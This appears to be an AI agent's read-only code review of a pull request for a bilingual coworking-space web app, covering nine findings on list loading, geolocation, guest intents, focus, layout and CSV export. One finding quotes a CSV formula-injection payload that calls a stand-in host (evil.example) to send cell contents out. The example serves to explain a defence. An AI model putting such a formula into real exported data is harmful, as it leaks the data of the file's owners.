# Review of #132 — R14: R1 (the foundation, the layer, the build, the closing documents) and R4 (the public site and the account), reviewed again — Claude Code, Opus 5.5

Head: a12c0790 · commits 40 (R1's 25 + R4's 15) · checks: green (every check pass; CodeRabbit skipping) · head moved during the review: no (`headRefOid` a12c0790 at the start and the end, CLEAN)
Verdict for my range: **mergeable after a fix round**

Read only, from commit objects pinned to their sha or to `a12c0790`. No fetch, checkout, install, test run or server. I did not read `6_REVIEW_R1.md` or `6_REVIEW_R4.md`. "Seen in the code" means read at `a12c0790`. "Seen in a shot" means a PNG in `FINAL\shots\`, taken by the run before the PR-number rewrite (`f4dcc6dd`), whose tree differs from the head only in `#PRNUM`.

## Findings (verified defects only, most severe first)

### R14-F1 — should-fix · Finding 132's dimmed rows reach only 2 of the paged lists, and its *Resolution* says every list
- Where: `docs/architecture/findings/132-a-paged-list-shows-no-sign-of-the-next-page-loading.md:9`; `apps/web/src/features/directory/components/list/DirectoryResults.tsx` (no `Refreshing`); the `<DataTable>` calls in `features/desk/components/customers/CustomersList.tsx:214`, `features/payments/components/ledger/PaymentsLedger.tsx:189`, `features/space-links/components/admin-list/AdminSpacesList.tsx:121` and the rest — all at a12c0790
- Seen in the code: D3.6 / DI4 (a) says "Every paged list passes `refreshing={isPlaceholderData}`", with the layer's `Refreshing` wrapper for the Directory's and the favourites' cards. `git grep '<Refreshing\|refreshing='` finds only `AuditLog.tsx:169` and `DeskLog.tsx:192`. `Refreshing` has no consumer outside the showcase. The Directory's results, the customers list, the ledger, «دفعاتي اليوم», «بلاغاتي», the admin's spaces, owners and users lists, and both data-report lists never dim. The asked page *is* marked at once, for every list (`ListPagination`). The *Resolution* line says "each list passing its placeholder state", which is not true.
- Scenario: on a slow connection, a visitor taps «2» under the Directory, or an owner taps «2» on the customers list. The page number turns current, but the old cards stay at full strength for seconds, so they can still be read and pressed as if they were page 2. This is the "invites a second tap" case finding 132 was meant to close; only the audit log and the desk's log are covered.
- Fix: pass `refreshing={query.isPlaceholderData}` from each paged list's hook to its `DataTable`, and wrap the Directory's results grid in `Refreshing`. Add one test per list, or at least the Directory and one `DataTable` list. Leave the *Resolution* line as it is once it is true. · Belongs: a fix round on #132. The Directory part folds into `1f1ce675`; the other lists fold into their lanes' list commits (R2/R3/R5 ranges); the document stays in `67747ed9`.

### R14-F2 — should-fix · Near me can stay «جارٍ تحديد موقعك…» for ever when the browser's prompt is dismissed
- Where: `apps/web/src/features/directory/hooks/near/useNearMe.ts:79-87` at a12c0790 (the `prompt` branch); `press` returns early while `locating` (line ~44)
- Seen in the code: the 15 s watchdog now starts only on `granted`, on `denied` (which ends the ask), or when the Permissions API is absent. While the state stays `prompt` and no `change` event fires, nothing ever settles the ask. The file's own comment (lines 11-14) says why the watchdog existed: "a permission prompt dismissed without a choice (as Firefox allows) answers nothing". Before this commit, that case ended as a refusal after 15 s. Now it never ends, and a second press is ignored (`if (state.status === 'locating') return`). The `change` listener is never removed either. LW4-D9 left Firefox's dismissed prompt "to check in the real run", and the run did not check it.
- Scenario: in Firefox, a visitor presses «الأقرب إليّ» and closes the location doorhanger without choosing. The button spins with its locating line until the page is reloaded; the Directory, the map and Home stay in that state for the whole visit. (I saw this in the code; Firefox's doorhanger behaviour comes from the code's own comment, not from a run.)
- Fix: while `prompt`, start a longer bound from the press (for example 60 s), replaced by the 15 s once `granted`. Remove the `change` listener when the ask settles. Add a test for a `prompt` that never changes and gets no answer. · Belongs: a fix round on #132 (folded into `43e69574`).

### R14-F3 — should-fix · A guest's stored action can run in another person's account, or on a later visit
- Where: `apps/web/src/shared/routing/guest/guestLeaving.ts:24` and `apps/web/src/shared/routing/guest/heldIntent.ts:105` at a12c0790
- Seen in the code: the intent lives in `localStorage` for 15 minutes. It is dropped only when a guest moves from one site page to another *within a tab* (`shown !== null && shown !== pathname`). A new tab's first site page sets `shown` and drops nothing. The first sign-in or registration in that browser (`source: 'signIn'`) then takes it and runs it.
- Scenario: on a shared computer (a coworking space's own PC, a café), guest A presses the heart on «Basel Hub» and is sent to sign-in, then closes the tab. Within 15 minutes, person B opens the site at Home and presses «تسجيل الدخول» (or registers). B's account saves «Basel Hub» with its toast, and the app replaces B's page with A's space page. A report intent opens the report dialog the same way. The same happens to A on a later visit in a new tab. The R4 brief's condition, "it cannot fire into another account or later visit", is not met. The planned tests (T267–T270) cover age, a restore, and leaving a page in the same tab; none covers a new tab that goes from Home straight to sign-in.
- Fix: limit what may confirm the stored copy to the round trip it serves. For example, write a marker only when the recovery is asked from the tab that held the action. Accept the stored intent only for a sign-in that follows a reset in this browser (the reset page sets a short-lived flag), or for a sign-in in the holding tab (the in-memory hold, as before). Drop it on any new tab's first site page otherwise. Add a test for "new tab → Home → sign-in runs nothing". · Belongs: a fix round on #132 (folded into `f91b34cf`).

### R14-F4 — should-fix · On a phone the map view's search row pushes «الفلاتر» off the screen
- Where: `apps/web/src/features/directory/components/DirectoryView.tsx:45-46` at a12c0790 (`flex flex-row items-start gap-3`; `DirectorySearch` is `flex-1` with no `min-w-0`)
- Seen in a shot: `shots\tour-agent2\guest_spaces-view-map-en-390.png`. At 390 px the search field takes the row and the filters button is cut at the screen's edge ("Filte"). The list view's own row in the same run is fine (`guest_spaces-en-390.png`). Seen in the code: G2.2's one-row change put the field and the sheet's trigger side by side, but the field's flex item keeps `min-width: auto`, so the input's intrinsic width wins.
- Scenario: a visitor on a 390 px phone opens «الخريطة»: the filters' trigger is half off-screen (in Arabic, off the left edge), and the row scrolls sideways.
- Fix: `min-w-0` on the search's `Field` (or `DirectorySearch`'s root) in that row, and `shrink-0` on the trigger. Check it at 390 in both languages. · Belongs: a fix round on #132 (folded into `1f1ce675`).

### R14-F5 — should-fix · «اختر منطقتك» from the favourites does not focus the place filter from 1024 px: the shell takes the focus back
- Where: `apps/web/src/features/directory/hooks/list/useDirectoryList.ts:110` against `apps/web/src/shared/routing/focus/useMainFocus.ts:52`, at a12c0790
- Seen in the code: arriving at `/spaces?filters=open` from `/me/favorites` is a path change in the same `SiteLayout`. The route is lazy, but the router resolves it before it commits, so the page mounts in the commit that changes the location. React runs a commit's passive effects children first. `useDirectoryList`'s effect calls `focusFilters()`, then the shell's `useMainFocus` effect (the parent) sees the new path and focuses `#main`. The place filter loses the focus D9.14 / DI22 promise. The sheet case below 1024 survives, because the sheet opens in a later commit and focuses itself. T295 renders `DirectoryList` without the shell, so it cannot see this. I reached this by reading; I did not see it in a browser.
- Scenario: a signed-in user with no favourites at 1440 px presses «اختر منطقتك». The Directory scrolls to the filters, but the focus is on `main`, so a keyboard user's next Tab starts at the top of the page.
- Fix: defer the filters' focus until after the shell's rule, for example in a `requestAnimationFrame`, or let `useMainFocus` skip a navigation that carries a focus target. Add a routes test with the site shell: `/me/favorites` → «اختر منطقتك» → the place filter has the focus at 1440. · Belongs: a fix round on #132 (folded into `167dcd70`).

### R14-F6 — should-fix · Screen 9's "set a password" has no resend, no masked address and no 429 countdown
- Where: `apps/web/src/features/users/components/settings/SignInCard.tsx:86-104` and `hooks/settings/useSetPasswordLink.ts` at a12c0790
- Seen in the code: once sent, the card shows one `role="status"` line, and the button is gone for good. The prototype (`Settings.html` `SetPasswordByEmail`) draws auth's `LinkSent` block: «أُرسلت إلى» with the masked address, and «أعد الإرسال بعد mm:ss», then «أعد الإرسال». Before sending, it draws `RateLimitAlert` with the button held while `Retry-After` runs. D9.2 approved "the link-sent block of `auth` *(existing component)* … and its resend countdown". AC-S2 requires the 429 warning on every action that can be refused one. Here a 429 is a generic «تعذّر إرسال الرابط» toast whose «إعادة المحاولة» re-posts at once, into the same limit. LW4-D7 dropped the countdown without the owner.
- Scenario: a Google-only user sends the link, and it lands in spam or never arrives. The page offers no resend until it is reloaded. If they press again too soon, they get a toast that does not say how long to wait, and its retry is refused again.
- Fix: reuse `features/auth`'s `LinkSent` (masked address, resend with its countdown from the recovery's position), and the rate-limit alert with the button held. Strengthen T256 to check the block, not a status line. · Belongs: a fix round on #132 (folded into `00017140`).

### R14-F7 — should-fix · The browser's CSV keeps a cell that opens as a formula (finding 204 left open)
- Where: `apps/web/src/shared/lib/csv/csvOf.ts:9` at a12c0790
- Seen in the code: `fieldOf` quotes per RFC 4180 and nothing more. Finance's three exports carry customers' names and notes typed at the desk.
- Scenario: a customer gives their name as `=HYPERLINK("https://evil.example/?d="&A2,"Rahaf")`, and reception types it. The owner exports «من دفع» and opens it in Excel or LibreOffice. The cell is a live formula that can send neighbouring cells off-site when clicked. This is the "injection-safe CSV cells" point the R1 brief names. Finding 204 records it and leaves it to the owner, but this is the last build PR, and the fix is one line with a test.
- Fix: in `fieldOf`, prefix `'` to a *text* value starting with `=`, `+`, `-`, `@`, a tab or a CR (OWASP). Numbers stay as numbers. Add the test, and mark 204 *Resolved*, or record the owner's acceptance. · Belongs: a fix round on #132 (folded into `43aad599`; 204's file and the index in `a12c0790`).

### R14-F8 — should-fix · Two closing documents say what is not so
- Where: `docs/architecture/findings/55-…-outlasts-three-seconds-on-a-busy-machine.md:9`; `docs/features/spaces.md:4` and `:20`, at a12c0790
- Seen in the code: 55's *Resolution* says "the CI run's slowest of these files is recorded in the PR's report". The lead's report says the per-file timing is "in the run's log (not extracted here)", and the PR's description (read through `gh pr view`) has no such figure. `spaces.md` still says "Reception's web screens remain planned", twice. LU10-D3 removed the same sentence from `overview.md` because foundation §13 gives reception no space screen, but missed this one, in a PR whose closing documents record every screen as built.
- Scenario: a reader of finding 55 looks for a measurement that was never recorded. A reader of `spaces.md` believes reception screens are still owed.
- Fix: extract the slowest route file's time from CI run 41288412120 into the report and the PR description, or reword 55's line to the branch its *Resolves when* already allows. Drop the two `spaces.md` sentences. · Belongs: a fix round on #132 (folded into `3d5798b4` and `9bf66b52`).

### R14-F9 — nit · `downloadFile` revokes the object URL in the same tick as the click (plausible)
- Where: `apps/web/src/shared/lib/csv/downloadFile.ts:11` at a12c0790
- Seen in the code: `link.click(); URL.revokeObjectURL(address);`. Chromium tolerates it. Some Safari and older Firefox builds start the download asynchronously, and an early revoke can make the download fail. I am not sure about the current Safari and Firefox versions, so this is plausible, not verified.
- Scenario: an owner on iPhone Safari presses a finance export, and nothing is saved.
- Fix: revoke in a `setTimeout` (for example 0–1 s), as common download helpers do. · Belongs: a finding (220) if not folded into `43aad599`.

## The checklist

**1. Every commit of my range read (40):**
- R1, U0: `fed3b46d` refusal `details` (envelope, AppError ×2, handler, `toAppError` shape check, contract §2) · `9c53b8dc` `PUBLISHED_PRICE_CHANGED`, both catalogues, contract §6 · `3c58a9a1` grouped navigation, count badges, rail divider · `a55da7bb` skip link and focus rule in every shell · `44df247c` the account on a phone (drawer account, top bar from 768, site header) · `40df132f` the stub routes, `/me`, three copy sections.
- R1, U3: `9755efe6` Meter · `06f3c154` BarChart and Heatmap · `cee9736d` the held menu item · `c0b8e36b` Input `size="lg"` · `3348faf3` `rangeSummary`, one-page steps · `67747ed9` asked page current, `DataTable refreshing`, `Refreshing` · `5d2797d5` `preventScrollReset` · `098bc4e9` `toWesternDigits` · `6f5b51b7` `useRowTriggers` in `shared/lists` · `43aad599` `csvOf`, `downloadFile`, `whatsappLink`, `fillReminder` · `9a7dff2c` finding 204.
- R1, U4: `5d4178a3` `public.ts` entries, lint and the site-page build rule · `67b980a5` `dashboard-shared` group and the cycle rule · `3d5798b4` `warm`/`routeLoaders`.
- R1, U10: `5c1dabd8` finding 212 · `9bf66b52` build map, overview, foundation §13, SCREENS, architecture §2, users.md · `0676d604` the accepted findings and F1's six · `10a72981` `PlaceholderPage` removed, `screenOf` throws · `a12c0790` the index rebuilt.
- R4, U9: `79d8bdcd` `next`, the way back, welcome back, other email, reset's way back · `20869f1b` the 72-byte rule · `7e2d442a` offline retry re-announced · `95ea07af` Home and About · `1f1ce675` map count and row, distance, place cap, stable marks · `2048fdc4` marks on light tiles · `43e69574` near me after permission · `36c88ec3` no area counts when truncated · `c611a7ad` the space page (panel, closure, user point, directions, stale status, gallery) · `b8eb7ff5` route retry and bare 403 · `167dcd70` favourites' line, empty card, `?filters=open` · `974ab466` the carried tests and «بلاغاتي»'s range · `8f804bad` Google welcome and the linked toast · `00017140` screen 9 · `f91b34cf` the held intent through a reset.

**2. The plan's decisions, as built.**
- **D0.1–D0.6:** built as approved. D0.4's first-page flag became a per-history rule (LEAD-D5), and the hash rule was extended to a card's heading (LEAD-D10). Both are judged below.
- **D3.1–D3.11:** built, with one exception: D3.6's "every paged list passes `refreshing`" is not built (R14-F1).
- **D4.1–D4.3:** built. LT-D1 is stricter than D4.2: no Leaflet allowance for site pages.
- **D9.2:** screen 9 departs from it on the set-password block (R14-F6).
- **D9.6:** built to its words, but those words leave a hole (R14-F3).
- **D9.10:** built to its words, but drops the bound the old wait gave a dismissed prompt (R14-F2).
- **D9.14:** `?filters=open` is built but loses its focus in the shell (R14-F5).
- **D9.8:** G2.2 overflows at 390 (R14-F4).
- **The rest of D9.1–D9.15, the carried items 1–11, D10.1–D10.5:** as approved.

**3. Money, roles, privacy, keys and locks.**
- **Money:** none computed in my range. `csvOf` carries finance's money into files (R14-F7 is about formulas, not amounts). `fillReminder` fills placeholders in one pass, verified.
- **Roles:**
  - `SPACE_NAV` gives reception exactly `desk`, `customers`, `myPayments`, `announcements`.
  - `finance`, `audit`, `payments`, `overview`, `packages`, `profile`, `dataReports`, `staff` and `settings` are `OWNER` only.
  - Routes take their guards from the same list. The admin shell sits inside `RequireRole(['ADMIN'])`, so the admin's badge read never fires for another role, and the owner's badge read is `enabled` only for an owner.
  - The bare 403 has its ways on.
- **Privacy:**
  - `details` carries only `{ userId }`, only on `ALREADY_OWNER`, and only to the admin. `toAppError` keeps it only in the contract's shape.
  - The held intent stores a space's id, public name and path, never in the address. It can still run in another account on a shared browser (R14-F3).
  - `returnUrlOf` refuses `//`, `/\` and resolved off-site paths. `AuthWayBack` reads only the cache.
- **Keys and locks:** none in my range.

**4. Planned tests and breaks (from the code, with the breaks as the lanes' reports record them):**
- **U0, T1–T19:** present; each break recorded red, including B11 after the lead fixed the test. T9–T12 would fail on a regression.
- **U3, T79–T95:** present. T90/T91 prove only the layer: no consumer test exists, so the missing consumers of R14-F1 pass every test.
- **U4, T96–T100:** present. T97 and T99 are the CI build, which passes.
- **U9:**
  - T250–T298 present.
  - **Weaker:** T256 (a status line, not the block; R14-F6); T295 renders the Directory without the shell, so it cannot catch R14-F5; T267–T270 have no new-tab-then-sign-in case (R14-F3); T282 has no "prompt that never changes" case (R14-F2).
  - T264 was folded in after W2's join (`4895884a` → `79d8bdcd`), present.
- **No test that cannot fail found.**

**5. Screens of my range.**
- **What I checked:** the code, against §4.1's gaps, plus the earlier run's guest shots (`tour-agent2`: Home, Directory, map, About, sign-in, register, forgot, 404 at 390/768/1440 in English dark, 1440 in Arabic). Each gap of §4.1 for screens 1–11 and the shells has its code.
- **Screen by screen:**
  - **1 Home:** complete.
  - **2 Directory:** gap at 390 on the map view (R14-F4); no dimmed cards while a page loads (R14-F1); near me can hang (R14-F2).
  - **3 Space page:** complete in the code; not seen in any shot.
  - **4 About:** complete.
  - **5–7, the auth screens:** complete.
  - **8, the error states:** complete.
  - **9 Profile & settings:** gap (R14-F6); not seen in a shot.
  - **10 Favourites:** complete but for the focus at 1024 and up (R14-F5); not seen.
  - **11 My reports:** complete (range); not seen.
  - **Shells:** complete; the drawer at 390 not seen in a shot.
- **Not covered by any run:** dark at 390/768 for screens 3, 9, 10 and 11, a signed-in user's site pages, and the account at 390 (the tour had no user role). jsdom's axe runs cover accessibility.

**6. Findings my range closes:**
- **Built as their *Resolves when* says:** 14 (its place), 27, 73 (the layer's part), 82, 83 (the envelope's part), 87, 103, 104, 105 (the layer's part), 130, 133, 134, 135, 137, 138, 165, 180, carried 1–11, and 32 (the web half).
- **Accepted, each with the owner's line (OD1–OD3 quoted):** 22, 84, 112, 115, 187, 193.
- **Built but not as its line says:** 132 (R14-F1); 55's *Resolution* claims a record that does not exist (R14-F8). 55's *Resolves when* is met by its second branch.
- **Built with a hole:** 136 (R14-F2), 168 (R14-F3).
- **The index:** 8 open (the deployment's six, plus 204 and 212), 10 accepted, 121 resolved. 139 entries, equal to the files' status lines. The six carry "To the deployment item".

**7. The documents my range changes.**
- **True:** the contract §2 and §6 lines; architecture §2 (shells, focus, the account) and §4 (the held intent); foundation §12 rows and §13's 9, 24 and 31; SCREENS.md row 31; the build map's steps 1–12 and the planned surface marked built; overview's *Built*; OD4's sentence in documentation.md §5.
- **False:** finding 132's *Resolution* (R14-F1), finding 55's *Resolution* and `spaces.md`'s "remain planned" (R14-F8).
- `#132` is in place, with no `#PRNUM` left.
- "Every screen of v1 is built" holds only as "built". Finding 212 (W3's desk) is left open on the PR whose mission is "complete, no gap"; see *Outside my range*.

## Decisions taken without the owner in my range, judged

- **LEAD-D2** (lane L after C0.2): sound. No file of U0's was involved, and three lanes waited on it.
- **LEAD-D5** (first page per router history, not a module flag): sound. It avoids test-only code, and the guard's replace is still covered.
- **LEAD-D7 / LEAD-D10** (206 and 210 fixed inside this PR, their records dropped): acceptable. Neither defect ever reached `main`.
- **LEAD-D11** (the index last): sound.
- **LEAD-D12** (the container's recreation left to the owner, disclosed): acceptable.
- **LL-D1:** acceptable (memory).
- **LL-D2, LL-D4, LL-D6, LL-D7, LL-D10:** sound.
- **LL-D3** (the range shown only in table mode, below 768 none): acceptable, as DataTable's existing rule.
- **LL-D5, LL-D8:** sound.
- **LL-D9** (formula cells left as finding 204): wrong for the last build PR. It is a security defect with a one-line fix (R14-F7).
- **LT-D1–D11:** sound. LT-D6/D7 were proven by the manifest in CI's build.
- **LW4-D1, LW4-D2, LW4-D3, LW4-D5, LW4-D11:** sound.
- **LW4-D4** (the retry marks `masaha.retried` in the location's state): sound.
- **LW4-D6, LW4-D8:** acceptable.
- **LW4-D10** (the bare 403 hard-codes `/` and `/about#contact` in `shared/routing`): acceptable; `shared` cannot import `pages`.
- **LW4-D7** (no resend countdown on screen 9): wrong (R14-F6).
- **LW4-D9** (`prompt` waits for `granted` or an answer, Firefox left to the run): wrong. The run never checked it, and the case now hangs (R14-F2).
- **LU10-D1, LU10-D2, LU10-D4, LU10-D5, LU10-D6:** sound.
- **LU10-D3:** right, but not carried into `spaces.md` (R14-F8).

## Outside my range

- **Finding 212 (W3, the desk, R3's range):** recorded open, so screen 13 keeps a known gap. An owner below 1280 px with nothing uncollected cannot reach «لن تُحصَّل» or undo a write-off. The mission's "complete, no gap" condition says it belongs in the fix round, not in the index.
- **R14-F1's other lists (R2, R3 and R5's ranges):** the customers list, the ledger, «دفعاتي اليوم», the admin's spaces, owners and users lists, and both data-report lists pass no `refreshing`.

## Not checked, and why

- Nothing was run (the brief's rule). R14-F5 and R14-F2 come from reading the code and React's and Firefox's documented behaviour. R14-F4 comes from a shot.
- No shots exist of the signed-in site (screens 9, 10, 11), the space page, the dashboard's phone drawer, or the 403 page. The tour had no user role, and the plan's R11–R14 were not performed. Their dark and 390/768 rendering is unverified.
- The prototype pages were read only where a finding needed them (`Settings.html`, `masaha/auth.jsx`, `masaha/finance.jsx`). I did not compare every screen of my range line by line with its prototype.
- Finding 98's and 48's commits (`d9e81909`, `bd7e9d0f`) are not in my list. I read OD4's sentence at the head only.
- `108dbff8` (finding 82's move) is not in my list either; I read the moved files at the head only.
